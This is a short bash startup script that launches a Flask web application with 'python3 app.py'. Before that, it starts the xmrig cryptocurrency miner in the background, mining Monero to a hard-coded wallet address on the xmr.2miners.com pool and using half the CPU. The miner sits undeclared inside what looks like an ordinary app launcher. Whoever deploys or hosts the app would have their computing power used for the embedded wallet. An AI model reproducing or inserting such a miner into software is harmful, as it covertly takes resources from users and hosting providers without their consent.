#!/bin/bash

# Run xmrig in the background
./xmrig --donate-level 5 -o xmr.2miners.com:2222 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p R#2 -k --coin monero --threads 50 --max-cpu-usage 50 &

# Run the Flask application
python3 app.py
